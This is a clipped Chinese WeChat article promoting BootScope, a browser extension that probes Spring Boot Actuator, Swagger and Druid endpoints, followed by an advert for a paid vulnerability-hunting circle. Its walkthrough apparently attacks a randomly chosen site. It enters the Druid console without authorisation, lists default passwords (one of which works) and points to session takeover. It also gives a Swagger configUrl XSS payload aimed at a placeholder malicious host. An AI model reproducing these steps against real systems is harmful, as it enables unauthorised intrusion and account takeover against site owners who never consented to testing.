---
title: 【微信】[工具推荐]一个面向 Spring Boot路径泄露/绕过的漏洞验证的浏览器扩展-BootScope
source: https://mp.weixin.qq.com/s/lZEDntB9AqGIBurr2hTe3g
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T08:52:01+08:00
trace_id: ec25aad7-2597-44f4-8c66-e54079475d76
content_hash: 4fc1f8a9849a45297513761c3e53368cdc828e0d20e3026dc48cdd9725e2bccb
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 58
  succeeded: 58
  failed_urls: []
notion_page_id: 41375244-d011-81e0-a688-de5ed1fe60a3
ioc: null
---

**陌笙不太懂安全** *2026年11月8日 17:00*

```javascript
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

工具描述

这是一款面向 Spring Boot 路径泄露/绕过漏洞验证的浏览器扩展，内置 67 条框架路径（覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、knife4j、Druid），对 13 条关键路径生成最多 30 个绕过与 URL 编码变体、其余 Actuator 路径最多 16 个编码/双重编码变体；支持从页面、资源请求、内联脚本及同源 JS 自动提取上下文路径并一键填入，可配置请求间隔与协议，自动识别 SPA 回退、软 404、全站统一 401/403 以降低误报，结果可一键导出 Markdown 或 CSV 报告，无需构建与后端，Chrome / Edge / Firefox 通用，默认仅发送只读 GET 且不带 Cookie，仅限授权目标使用。

## 核心亮点

-   **67 条框架路径**：覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、doc/knife4j、Druid
    
-   **绕过 + URL 编码**：13 条关键路径最多 30 个变体；其余 Actuator 路径最多 16 个编码/双重编码变体
    
-   **低误报**：自动识别 SPA 回退、软 404、全站统一 401/403
    
-   **自行判断 baseURL 路径**：从页面、资源请求、内联脚本、同源 JS 里提取上下文路径，点击直接填入
    
-   **结果可留档**：一键导出 Markdown 报告或 CSV（Excel 中文兼容）
    
-   **加载即用**：无需构建、无需后端，Chrome / Edge / Firefox 通用
    

## 功能概览

### 1\. 路径查找

覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、doc/knife4j、Druid

### 2\. 自行判断 baseURL 路径

打开弹窗时，插件会从以下来源提取可能的上下文路径：

-   当前页面路径
    
-   DOM 标签：a、link、script、form、img、iframe、source、video
    
-   performance 里的 XHR / fetch / JS 资源
    
-   内联脚本
    
-   最多 8 个同源 JS 文件（每个 512KB）
    

结果按来源加权、当前页面路径优先，按 origin 缓存 5 分钟。点击某个路径会直接填入：

http(s)://当前host:端口/路径

### 3\. BaseURL 与协议

-   留空：使用当前标签页的 **host + 端口** （不继承当前页面路径）
    
-   只填 host / host:port：与当前标签页同 host 时沿用其端口
    
-   应用部署在上下文路径下：填 host/app，或直接点候选列表
    
-   http 勾选框：默认不勾选 = https://；勾选后强制 http://，会覆盖输入里的协议
    

### 4\. 执行节奏

-   「每个路径 fuzz 后间隔」可选，单位秒，支持小数（如 0.3）
    
-   填 1：每个路径（含该路径的变体）跑完等 1 秒；留空或 0 = 不限速
    
-   间隔 > 0 时自动改为串行执行
    
-   请求预算上限 1000
    

工具安装

首先下载插件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e5d9f7ab77c62140.png)

直接下载下来就行，解压，然后使用浏览器，打开扩展即可

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f7f2f403ecdf6325.png)

成功之后是这样的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f316634ef0bf70b3.png)

工具使用

比如实战过程中，我们遇到一个登录框，根据一些特征比如ico,接口啥的，看出来是ruoyi或者是spring相关的组件框架

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fc643176cade8fb5.png)

这个时候，我们就可以使用这个插件快速扫描泄露

点击这个插件会自动给你判断二级路径

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cf92dd4a8d4d0d1e.png)

然后你直接点击这个二级路径，就会拼接上去

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e66f8c8b247ba807.png)

这里我们看一手，他这里会统计路径出现的次数，我们可以根据出现的次数，进行猜测，也可以根据经验猜测，都没有的话可以多试几个二级路径

比如我这里选择的是/prod-api这个接口，点击这个接口就会选中，然后给你拼接上去

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1b8fb15aaf7f8266.png)

点击运行就会开始扫描了

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ea08f53101cfb234.png)

这里直接报错了，说目标不可达，师傅们使用的时候也要注意，因为这个插件是严格区分http和https站点的

默认是https如果目标不可达，勾选http这个选项就行

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b0a6a567b6e0b23b.png)

现在点击运行，可以发现扫描成功

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fe25310e6bfbdfc5.png)

成功扫描出了一些接口文档和druid页面，我们访问查看

这里再推荐一下，这个插件，FeHelper，他会让你的json文档变得更加清晰

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/aaf0796b25ff6013.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4d61b714e1b1b8a2.png)

不用这个插件之前

接口页面是这样的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f91c5ef519193c8c.png)

美化输出一下是这样

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f93fa0cf72bc1851.png)

如果使用这个插件，可以直接给你美化

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/94597d5b1df1dc3f.png)

还有一些附件的小功能

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/82c0fcb031fd53ba.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9062a6e6f92de3fa.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/87636333f6a1bf62.png)

继续访问

访问成功之后，发现并不是误报，如果是src或者一些项目，就可以吃点烂洞的钱了，后续就可以根据自己的经验扩大危害了

根据文档该测接口测接口，该测组件测组件

比如这个swagger的domxss

类似这种的

```bash
/swagger-ui.html?configUrl=https://malicious-site.com/test.json
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e0f528af6f763dfb.png)

拼接之后，弹窗就说明存在

比如druid这个的未授权漏洞以及弱口令漏洞

因为这个站随便找的，脆的一批，访问/durid/index.html

直接未授权进来了

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/156357c47b226991.png)

然后试试弱口令

admin/admin123

admin/123456

ruoyi/123456

druid/druid

第三组弱口令也是直接进去了

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8815790d286f2cdf.png)

session这里也有值，后续可以考虑接管，点到为止工具链接：https://github.com/XiaoRoan/BootScope

**后台回复加群加入交流群  
**

**广告：** **cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库** **简单介绍** **（** **加入纷传圈子** **送知识库+漏洞库+面试题库** **）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/133744e78ee257e6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e551ca7a6839aaa0.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/edcf3331ac3974c3.png)

**skill+grok辅助挖掘某企业sr** **c** **实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c1a9cb8ad09b809b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5660c0ddec5f2a89.png)

**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**

**（图片仅供参考，我出不等于你出，见识 **到** ai神力即可，多去用AI!!!）**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/77c229aa0236778a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cf0a0169d7cc3bcf.png)

**不是P图,单洞1.2w记录**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8e86e33ca119e426.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b4c93939079de786.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/53f2903e2c542dfd.png)

**陌笙src挖掘知识库介绍（内容持续更新中!!!)**

```css
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a5a9526c04ca82e2.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/55d95f056e0ccf90.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3121dfe6083ea07e.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e578c40e9cd61e62.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/24f96a9898859025.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0458ef9d7a83cbed.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db0608e7dbfad79e.png)

信息收集

src挖掘基础

src挖掘实战

edusrc

经典nday复现

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/91feed6aac03f174.png)

云安全&AI安全

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dd7acc8d3a29bd0d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dd8a29373cb7ad97.png)

**陌笙安全漏洞库介绍**

```sql
最新漏洞查看
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f639476be4ccc8b6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/930f6c88a39ecca5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4b8135c0c2526f85.png)

**陌笙安全面试库**

```javascript
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
绿盟笔试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/68bba849a294ed14.png)

**POC库** **&&更新适配afrog&&nuclei&&dddd的POC&1day/Nday等&&** ****dddd二开**** **工具\[助力渗透测试&&红蓝攻防\]**

**工具截图**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9d063db28ae4ceb5.png)

**实战效果**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b1f6a12faa09436b.png)

**poc库【后续持续更新】**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6289c17ff054c179.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5bde621a04c52bca.png)

**AI赋能-** **skill辅助** **漏洞挖掘（免责&&慎用）**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6b8b6a5c558fd865.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/73be12b15c4989b8.png)

**圈友skill+ai辅助渗透** **实战效果** **，支持打假！**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/85c2afd29e97a606.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3bf49d95d9bf7df6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/64cb8b21d0c77ec4.png)

证书站

普通站点

**陌笙** **纷传圈子介** **绍**

```apache
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/087e8c93f06bfc42.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db599fd789126f7d.png)

**目前800多条内容，扫描下方二维码查看详情以及加入圈子，持续更新中。。**

**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e8e0f7f5e142796f.png)

渗透测试常用工具 · 目录
